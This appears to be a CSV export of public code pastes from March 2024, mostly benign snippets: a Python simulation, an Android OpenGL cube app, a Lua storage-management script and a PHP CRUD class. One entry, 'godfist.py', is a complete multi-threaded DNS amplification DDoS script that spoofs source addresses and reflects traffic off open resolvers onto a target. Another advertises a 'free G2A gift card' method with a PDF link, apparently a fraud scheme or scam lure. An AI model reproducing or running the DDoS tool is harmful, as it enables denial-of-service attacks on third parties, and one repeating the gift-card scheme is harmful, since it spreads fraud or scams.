id,title,username,language,date,content
4qvg67RM,Untitled,icarussiano,Python,Monday 18th of March 2024 12:04:28 PM CDT,"from random import choice
N = 1000000
def occurences(sub, string):
    return sum(1 for i in range(len(string)) if string.startswith(sub, i))
seqs = [''.join(choice(['T', 'C']) for _ in range(100)) for _ in range(N)]
counts = [(seq.count('TC'), occurences('CC',seq)) for seq in seqs]
bob_counts=sorted([x for x,y in counts])
alice_counts=sorted([y for x,y in counts])
import matplotlib.pyplot as plt
import numpy as np
from collections import Counter
bob_mean, bob_median = np.mean(bob_counts), np.median(bob_counts)
alice_mean, alice_median = np.mean(alice_counts), np.median(alice_counts)
bob_counts = Counter(bob_counts)
bob_counts_keys, bob_counts_values = list(bob_counts.keys()), list(bob_counts.values())
alice_counts = Counter(alice_counts)
alice_counts_keys, alice_counts_values = list(alice_counts.keys()), list(alice_counts.values())
label_bob = f'Bob mean: {bob_mean:.2f}, median: {bob_median:.2f}'
label_alice = f'Alice mean: {alice_mean:.2f}, median: {alice_median:.2f}'
plt.plot(bob_counts_keys, bob_counts_values, label=label_bob)
plt.plot(alice_counts_keys, alice_counts_values, label=label_alice)
plt.legend()
plt.show()"
4es1Gwbp,Untitled,Pykmi,Python,Monday 18th of March 2024 11:49:33 AM CDT,"from pathlib import Path

# Create a path object
p1 = Path('Assets/backgrounds/background1.png')

# You can also combine parts of paths in a way that is independent of the OS
p2 = Path('Assets') / 'backgrounds' / 'background1.png'

# prints Assets/backgrounds/background1.png
print(p1)

# prints Assets/backgrounds/background1.png
print(p2)"
ZLMpy4p2,CubeRenderer,Bobita,Java,Monday 18th of March 2024 11:45:09 AM CDT,"package bouncycube.cg.bouncycube;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import javax.microedition.khronos.opengles.GL10;
import javax.microedition.khronos.opengles.GL11;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.FloatBuffer;

import javax.microedition.khronos.egl.EGLConfig;
import android.opengl.GLSurfaceView;
import java.lang.Math;

import android.view.WindowManager;

class CubeRenderer implements GLSurfaceView.Renderer{

    private Cube mCube;
    private float mTransY;
    private float mAngle;

    public final static int SS_SUNLIGHT = GL10.GL_LIGHT0;

    public CubeRenderer() {
        mCube = new Cube();
    }

    public void onDrawFrame(GL10 gl) {
        gl.glClear(GL10.GL_COLOR_BUFFER_BIT | GL10.GL_DEPTH_BUFFER_BIT);
        gl.glMatrixMode(GL10.GL_MODELVIEW);
        gl.glLoadIdentity();
        gl.glTranslatef(0.0f, (float) Math.sin(mTransY), -7.0f);
        mTransY += 0.3f;
        gl.glRotatef(mAngle, 0.0f, 1.0f, 0.0f);
        gl.glRotatef(mAngle, 1.0f, 0.0f, 0.0f);
        mAngle += 0.4;
        gl.glEnableClientState(GL10.GL_VERTEX_ARRAY);
        gl.glEnableClientState(GL10.GL_COLOR_ARRAY);
        mCube.draw(gl);
    }

    protected static FloatBuffer makeFloatBuffer(float[] array)
    {
        ByteBuffer bb = ByteBuffer.allocateDirect(array.length*4);
        bb.order(ByteOrder.nativeOrder());
        FloatBuffer fb = bb.asFloatBuffer();
        fb.put(array);
        fb.position(0);
        return fb;
    }

    public void initLighting(GL10 gl)
    {
        float[] green = {0.0f, 1.0f, 0.0f, 1.0f};
        float[] position = {10.0f,0.0f,3.0f,1.0f};
        float[] red = {1.0f, 0.0f, 0.0f, 1.0f};
        float[] blue = {1.0f, 1.0f, 0.0f, 1.0f};
        float[] yellow = {1.0f, 1.0f, 0.0f, 1.0f};

        gl.glLightfv(SS_SUNLIGHT, GL10.GL_POSITION, makeFloatBuffer(position));
        gl.glLightfv(SS_SUNLIGHT, GL10.GL_DIFFUSE, makeFloatBuffer(green));
        gl.glLightfv(SS_SUNLIGHT,GL10.GL_SPECULAR, makeFloatBuffer(red));
        gl.glLightfv(SS_SUNLIGHT, GL10.GL_AMBIENT, makeFloatBuffer(blue));
        gl.glShadeModel(GL10.GL_SMOOTH);

        gl.glEnable(GL10.GL_LIGHTING);
        gl.glEnable(SS_SUNLIGHT);

        gl.glMaterialfv(GL10.GL_FRONT_AND_BACK, GL10.GL_DIFFUSE, makeFloatBuffer(red));
        gl.glMaterialfv(GL10.GL_FRONT_AND_BACK, GL10.GL_SPECULAR, makeFloatBuffer(red));
        gl.glMaterialf(GL10.GL_FRONT_AND_BACK,GL10.GL_SHININESS, 5);
        gl.glMaterialfv(GL10.GL_FRONT_AND_BACK, GL10.GL_AMBIENT, makeFloatBuffer(blue));

        gl.glLightf(SS_SUNLIGHT, GL10.GL_LINEAR_ATTENUATION, 0.025f);

        float direction[]= {1.0f,0.0f,0.0f};
        gl.glLightfv(GL10.GL_LIGHT0, GL10.GL_SPOT_DIRECTION, makeFloatBuffer(direction));
    }


    public void onSurfaceChanged(GL10 gl, int width, int height) {
        gl.glViewport(0, 0, width, height);
        gl.glMatrixMode(GL10.GL_PROJECTION);
        gl.glLoadIdentity();
        float fieldOfView = 30.0f/57.3f;
        float aspectRatio = (float)width/(float)height;
        float zNear = 0.1f;
        float zFar = 1000;
        float size = zNear * (float)(Math.tan((double)(fieldOfView/2.0f)));
        gl.glFrustumf(-size, size, -size/aspectRatio, size/aspectRatio, zNear, zFar);
        gl.glMatrixMode(GL10.GL_MODELVIEW);

        gl.glDepthMask(true);
        initLighting(gl);
    }


    public void onSurfaceCreated(GL10 gl, EGLConfig config) {
        //gl.glDisable(GL10.GL_DITHER);
        gl.glHint(GL10.GL_PERSPECTIVE_CORRECTION_HINT, GL10.GL_FASTEST);
        gl.glClearColor(0,0,0,0);
        gl.glEnable(GL10.GL_CULL_FACE);
        gl.glShadeModel(GL10.GL_SMOOTH);
        gl.glEnable(GL10.GL_DEPTH_TEST);
    }
}"
3PPy5zc7,Cube,Bobita,Java,Monday 18th of March 2024 11:44:53 AM CDT,"package bouncycube.cg.bouncycube;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import javax.microedition.khronos.opengles.GL10;
import javax.microedition.khronos.opengles.GL11;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.FloatBuffer;

import javax.microedition.khronos.egl.EGLConfig;
import android.opengl.GLSurfaceView;
import java.lang.Math;

import android.view.WindowManager;


public class Cube {

    private FloatBuffer mFVertexBuffer;
    private FloatBuffer mNormalBuffer;
    private ByteBuffer mColorBuffer;
    private ByteBuffer mTFan1, mTFan2;

    public Cube() {
        float vertices[] =
                {
                        -1.0f, 1.0f, 1.0f,
                        1.0f, 1.0f, 1.0f,
                        1.0f, -1.0f, 1.0f,
                        -1.0f, -1.0f, 1.0f,
                        -1.0f, 1.0f, -1.0f,
                        1.0f, 1.0f, -1.0f,
                        1.0f, -1.0f, -1.0f,
                        -1.0f, -1.0f, -1.0f
                };
        float[] normals =
                {
                        -1.0f/(float)Math.sqrt(3), 1.0f/(float)Math.sqrt(3), 1.0f/(float)Math.sqrt(3),
                        1.0f/(float)Math.sqrt(3), 1.0f/(float)Math.sqrt(3), 1.0f/(float)Math.sqrt(3),
                        1.0f/(float)Math.sqrt(3), -1.0f/(float)Math.sqrt(3), 1.0f/(float)Math.sqrt(3),
                        -1.0f/(float)Math.sqrt(3), -1.0f/(float)Math.sqrt(3), 1.0f/(float)Math.sqrt(3),
                        -1.0f/(float)Math.sqrt(3), 1.0f/(float)Math.sqrt(3), -1.0f/(float)Math.sqrt(3),
                        1.0f/(float)Math.sqrt(3), 1.0f/(float)Math.sqrt(3), -1.0f/(float)Math.sqrt(3),
                        1.0f/(float)Math.sqrt(3), -1.0f/(float)Math.sqrt(3), -1.0f/(float)Math.sqrt(3),
                        -1.0f/(float)Math.sqrt(3), -1.0f/(float)Math.sqrt(3), -1.0f/(float)Math.sqrt(3)
                };
        byte maxColor=(byte)255;
        byte colors[] =
                {
                        maxColor, 0, 0, maxColor,
                        maxColor, 0, 0, maxColor,
                        maxColor, 0, 0, maxColor,
                        maxColor, 0, 0, maxColor,
                        0, 0, 0, maxColor,
                        0, 0, 0, maxColor,
                        0, 0, 0, maxColor,
                        0, 0, 0, maxColor,
                };
        byte tFan1[] =
                {
                        1,0,3,
                        1,3,2,
                        1,2,6,
                        1,6,5,
                        1,5,4,
                        1,4,0
                };
        byte tFan2[] =
                {
                        7,4,5,
                        7,5,6,
                        7,6,2,
                        7,2,3,
                        7,3,0,
                        7,0,4
                };
        ByteBuffer vbb = ByteBuffer.allocateDirect(vertices.length * 4);
        vbb.order(ByteOrder.nativeOrder());
        mFVertexBuffer = vbb.asFloatBuffer();
        mFVertexBuffer.put(vertices);
        mFVertexBuffer.position(0);
        mColorBuffer = ByteBuffer.allocateDirect(colors.length);
        mColorBuffer.put(colors);
        mColorBuffer.position(0);
        mTFan1 = ByteBuffer.allocateDirect(tFan1.length);
        mTFan1.put(tFan1);
        mTFan1.position(0);
        mTFan2 = ByteBuffer.allocateDirect(tFan2.length);
        mTFan2.put(tFan2);
        mTFan2.position(0);

        ByteBuffer nbb = ByteBuffer.allocateDirect(normals.length * 4);
        nbb.order(ByteOrder.nativeOrder());
        mNormalBuffer = nbb.asFloatBuffer();
        mNormalBuffer.put(normals);
        mNormalBuffer.position(0);
    }

    public void draw(GL10 gl) {
        gl.glVertexPointer(3, GL11.GL_FLOAT, 0, mFVertexBuffer);
        gl.glColorPointer(4, GL11.GL_UNSIGNED_BYTE, 0, mColorBuffer);
        gl.glDrawElements( gl.GL_TRIANGLE_FAN, 6 * 3, gl.GL_UNSIGNED_BYTE, mTFan1);
        gl.glDrawElements( gl.GL_TRIANGLE_FAN, 6 * 3, gl.GL_UNSIGNED_BYTE, mTFan2);

        gl.glNormalPointer(GL10.GL_FLOAT, 0, mNormalBuffer);
        gl.glEnableClientState(GL10.GL_NORMAL_ARRAY);
    }

}"
XcyUMU3m,BouncyCubeActivity,Bobita,Java,Monday 18th of March 2024 11:44:36 AM CDT,"package bouncycube.cg.bouncycube;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import javax.microedition.khronos.opengles.GL10;
import javax.microedition.khronos.opengles.GL11;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.FloatBuffer;

import javax.microedition.khronos.egl.EGLConfig;
import android.opengl.GLSurfaceView;
import java.lang.Math;

import android.view.WindowManager;

public class BouncyCubeActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        GLSurfaceView view = new GLSurfaceView(this);
        view.setRenderer(new CubeRenderer());
        setContentView(view);
    }
}"
sDtnhhvy,warehouse_interface-manifest,promitheus_sal,Lua,Monday 18th of March 2024 11:33:58 AM CDT,"return {
    [""install""]=function(pb,D,dir)if not(pb and D and dir)then error(""bad params"")end;local f=io.open(fs.combine(D,""wif.lua""),""w"");f:write(pb.get(""gFywYSdV""));f:flush();f:close();end,
    [""remove""]=function(pb,D,dir)if not(pb and D and dir)then error(""bad params"")end;fs.delete(fs.combine(D,""wif.lua""));end
}"
gFywYSdV,warehouse_interface,promitheus_sal,Lua,Monday 18th of March 2024 11:27:25 AM CDT,"
STORAGE_ROOT_DIR = ""./""
STORAGE_BIN_LIST_FILENAME = ""bins.list""
bins = {}
main_bin = """"

function logwarn(e)
    print(""WARN> ""..e)
end

function logerr(e)
    print(""ERROR> ""..e)
end

function logverb(e)
    print(""VERBOSE> ""..e)
end

--read bins
for l in io.lines(STORAGE_ROOT_DIR..STORAGE_BIN_LIST_FILENAME) do
    local a,b,c = l:match(""^([^;]+);([^;]+);([^;]+)$"")
    if bins[b]~=nil then
        logwarn((""Duplicate bin alias detected: key '%s' already declared ('%s'), ignoring new value""):format(b,bins[b]))
    else
        bins[b]={type=a,id=b,val=c}
    end

    for id, dat in pairs(bins) do
        if dat.type==""main"" then
            if main_bin~="""" then
                logwarn(string.format(""Duplicate main bin detected (%s); ignoring new value"",main_bin))
            else
                main_bin = id
            end
        end
    end
end

function list_bins(all,type,blacklist,limit)
    local r = {}
    blacklist = blacklist or {}
    limit=limit or 1000000
    if limit==-1 then limit=1000000 end
    for id,dat in pairs(all) do
        if (not blacklist[id]) and (type==dat.type) then
            r[id] = dat
        end
    end
    return r
end

function pushItems(from,to,inslot,limit,toslot)
    local r = peripheral.call(from,""pushItems"",to,inslot,limit,toslot)
    print(string.format(""Moving %d items from '%s' to '%s'"",r,from,to))
    return r
end

function getInvSize(inv)
    return peripheral.call(inv,""size"")
end

function listInv(inv)
    return peripheral.call(inv,""list"")
end

function itemDetails(inv,slot)
    return peripheral.call(inv,""getItem"",slot).getMetadata()
end

function store_to(from,fromslot,to,limit)
    return pushItems(from.val,to.val,fromslot,limit)
end

function store_all_to(from,to,limit)
    local t=0
    limit=limit or 1000000
    if limit==-1 then limit=1000000 end
    for slot,item in pairs(listInv(from)) do
        t=t+pushItems(from.val,to.val,slot,limit-t)
        if t==limit then return limit end
    end
    return t
end

function store_to_any(from,fromslot,tolist,limit)
    local t=0
    limit=limit or 1000000
    if limit==-1 then limit=1000000 end
    local l={}
    for id,dat in pairs(tolist) do
        table.insert(l,dat)
    end
    for _,dat in pairs(l) do
        t=t+pushItems(from.val,dat.val,fromslot,limit-t)
        if t==limit then return limit end
    end
    return t
end

function store_all_to_any(from,tolist,limit)
    limit=limit or 1000000
    if limit==-1 then limit=1000000 end
    local t=0
    for slot,item in pairs(listInv(from.val)) do
        t=t+store_to_any(from,slot,tolist,limit-t)
        if t==limit then return limit end
    end
    return t
end

function default_filter(txt)
    return function (det)
        local f = txt:lower()
        local a = det.name:lower():find(f)
        local b = det.displayName:lower():find(f)
        return a or b
    end
end

function fetch_from(from,to,filter,limit)
    if type(filter)~=""function"" then if filter then filter=function() return true end else filter=function() return false end end end
    local t=0
    limit=limit or 1000000
    if limit==-1 then limit=1000000 end
    for slot,item in pairs(listInv(from.val)) do
        if filter(itemDetails(from.val,slot)) then
            t=t+store_to(from,slot,to,limit-t)
        end
        if limit==t then return limit end
    end
    return t
end

function fetch_from_any(fromlist,to,filter,limit)
    if type(filter)~=""function"" then if filter then filter=function() return true end else filter=function() return false end end end
    local t=0
    limit=limit or 1000000
    if limit==-1 then limit=1000000 end
    local l = {}
    for id,dat in pairs(fromlist) do
        table.insert(l,dat)
    end
    for _,dat in pairs(l) do
        t=t+fetch_from(dat,to,filter,limit-t)
        if limit==t then return limit end
    end
    return t
end

function tokens(str)
    local tok = {}
    local isStr = false
    local cur = """"
    for i=1,#str do
        local nc = str:sub(i,i)
        if nc==""'"" then
            isStr = not isStr
        else
            if nc==' ' and not isStr then
                if cur~='' then
                    table.insert(tok,cur)
                end
                cur=''
            else
                cur=cur..nc
            end
        end
    end
    table.insert(tok,cur)
    return tok
end

function exec_command(cmd)
    local tk = tokens(cmd)
    cmd = tk[1]
    if cmd==""storeall"" or cmd=='s' then
        print((""Stored %d items.""):format(store_all_to_any(bins[main_bin],list_bins(bins,""storage"",false))))
    elseif cmd==""fetch"" or cmd=='f' then
        print((""Fetched %d x '%s'.""):format(fetch_from_any(list_bins(bins,""storage"",false),bins[main_bin], default_filter(tk[2]), tonumber(tk[3] or -1)),tk[2]))
    elseif cmd=='moveto' or cmd=='m' then
        local where = tk[2]
        local what = tk[3]
        local limit = tonumber(tk[4])
        print(string.format(""Moved %d x '%s' to '%s'."",fetch_from_any(list_bins(bins,""storage"",{[where]=true}),bins[where],default_filter(what),limit),what,where))
    elseif cmd=='listbins' or cmd=='lb' then
        print(""Listing bins:"")
        for id,v in pairs(bins) do
            print(string.format(""#'%s': pid=\""%s\"" type='%s'"",id,v.val,v.type))
        end
    elseif cmd=='main' then
        main_bin = tk[2]
        print(""Set '""..tk[2]..""' as main bin."")
    elseif cmd=='help' or cmd=='h' then
        print([[
Help:
storeall -> store all items from main bin to any storage
moveto | m <where> <filter> <limit> -> move at most <limit >items that meet <filter> from any storage to <where>
fetch | f <filter> <limit> -> same as ""moveto main <filter> <limit>""
main <bin> -> set <bin> as main bin
listbins -> list all bins
        ]])
    elseif cmd==""exit"" or cmd==""quit"" or cmd==""q"" then return false end
    return true
end

logverb(string.format(""Main bin: %s"",main_bin))
logverb(""Bins:"")
for id,v in pairs(bins) do
    logverb(string.format(""%s: type: %s val: %s"",id,v.type,v.val))
end

while exec_command(io.read('*l')) do end"
gPtVbnsu,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Monday 18th of March 2024 11:18:33 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
18 March 2024















































"
unh40sMh,godfist.py,betrayed,Python,Monday 18th of March 2024 10:44:09 AM CDT,"#!/usr/bin/env python3

# DNS AMPLIFICATION DDOS SCRIPT
# MULTI-THREADED AND SPOOFED / NO VPN OR PROXIES NEEDED!
# CODED BY BETRAYED

# TESTED ON 03/18/2K24:
#	KALI LINUX, GNU/Rolling 2024.1

from scapy.all import *
from urllib.parse import urlparse
import time, sys, threading, socket, random
rslvrs = []

_abort = False
ipadr = ''
hname = ''
lnCnt = 0

def _dns():
    while _abort == False:
        try:
            # The DNS server will be chosen from list randomly. This can
            # be easily modified to choose server IPs in order and work down the list.
            _Server = random.choice(rslvrs)
            _fakeIP = ""."".join(str(random.randint(0, 255)) for _ in range(4))

            packet = IP(dst=_Server, src=_fakeIP) / UDP(sport=RandShort(), dport=53) / DNS(rd=1,opcode=0,qd=DNSQR(qname=hname,qclass=""IN"",qtype=sys.argv[2]))
            send(packet, verbose=False)
        except:
            pass

def main():
    if len(sys.argv) != 6:
        sys.exit(""\r\n   SYNTAX: <IP/URL> <QUERY-TYPE> <TIME> <THREAD/S> <DNS-SRV-LIST.TXT>\r\n"")
        
    if not 'SUDO_UID' in os.environ:
        sys.exit(""\r\n   Script requires root elevation!\r\n"")
        
    # QUERY TYPES:
    #   A     - IPv4             #  NS  - Name Server
    #   AAA   - IPv6             #  SOA - Start of Authority
    #   CNAME - Canonical Names  #  MX  - Mail Exchange
    #   PRT   - Pointer


    # append DNS list to array
    global rslvrs, _abort, hname, ipadr, lnCnt
    try:
        with open(sys.argv[5], ""r"") as f:
            for line in f:
                lnCnt +=1
                if ""\n"" in line:
                    # remove any carriage return/s
                    line = line.replace(""\n"", """")
                    rslvrs.append(line)
                else:
                    rslvrs.append(line)
    except KeyboardInterrupt:
        sys.exit(""\r\n Aborted.\r\n"")
    except: #FileNotFoundError:
        sys.exit(""\r\n Unable to read from list! Exiting...\r\n"")
        
    
    # correctly format target ip/url for attack
    try:
        targ = sys.argv[1]
        if not (targ.lower().startswith(""http://"") or targ.lower().startswith(""https://"")):
            targ = ""http://"" + targ
        
        hname = urlparse(targ).netloc
        ipadr = socket.gethostbyname(hname)
    except:
        sys.exit(""\r\n Hostname resolution error!\r\n"")

    # run DNS-AMP thread/s
    tasks = []
    for i in range(int(sys.argv[4])):
        x = threading.Thread(target = _dns)
        tasks.append(x)
        x.start()
    
    print(""""""\r\n\r\n\r\n\r\n\r\n
   ▄████  ▒█████  ▓█████▄   █████▒██▓  ██████ ▄▄▄█████▓
  ██▒ ▀█▒▒██▒  ██▒▒██▀ ██▌▓██   ▒▓██▒▒██    ▒ ▓  ██▒ ▓▒
 ▒██░▄▄▄░▒██░  ██▒░██   █▌▒████ ░▒██▒░ ▓██▄   ▒ ▓██░ ▒░
 ░▓█  ██▓▒██   ██░░▓█▄   ▌░▓█▒  ░░██░  ▒   ██▒░ ▓██▓ ░ 
 ░▒▓███▀▒░ ████▓▒░░▒████▓ ░▒█░   ░██░▒██████▒▒  ▒██▒ ░ 
  ░▒   ▒ ░ ▒░▒░▒░  ▒▒▓  ▒  ▒ ░   ░▓  ▒ ▒▓▒ ▒ ░  ▒ ░░   
   ░   ░   ░ ▒ ▒░  ░ ▒  ▒  ░      ▒ ░░ ░▒  ░ ░    ░    
 ░ ░   ░ ░ ░ ░ ▒   ░ ░  ░  ░ ░    ▒ ░░  ░  ░    ░      
       ░     ░ ░     ░            ░        ░           
                   ░
"""""")
    print("" Reflecting attack using "" + str(lnCnt) + "" DNS servers. CTRL+C to end...\r\n"")
    
    # allow attack to run for user-specified time
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() < _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    # kill any/all active thread/s
    _abort = True
    for y in tasks:
        y.join()
 
    sys.exit(""\r\n\r\n Job complete!\r\n"")
    
if __name__ == ""__main__"":
    main()
"
txpNisnZ,Untitled,tabr,PHP,Monday 18th of March 2024 10:35:52 AM CDT,"<?php

require_once(__DIR__ . '/../CRUD.php');

class CompanyInfo extends CRUD{
	function __construct($domain_name = '') {
		parent::__construct($domain_name);
		$this->appendField('companyName', 'varchar(128)');
		$this->appendField('shortName', 'varchar(32)');
		$this->appendField('INN', 'varchar(16)');
		$this->appendField('KPP', 'varchar(16)');
		$this->appendField('OGRN', 'varchar(16)');
		$this->appendField('accountNumber', 'varchar(32)');
		$this->appendField('bankName', 'varchar(128)');
		$this->appendField('corrAccount', 'varchar(32)');
		$this->appendField('BIK', 'varchar(16)');
		$this->appendField('legalAddress', 'varchar(128)');
		$this->appendField('zip', 'varchar(16)');
		$this->appendField('director', 'varchar(64)');
		$this->appendField('phone', 'varchar(32)');
		$this->appendField('email', 'varchar(32)');
		$this->appendField('website', 'varchar(64)');
		//$this->appendField('bonus', 'varchar(32)');
		//$this->appendField('paid', 'varchar(32)');
		//$this->appendField('discount', 'varchar(32)');
	}
}
"
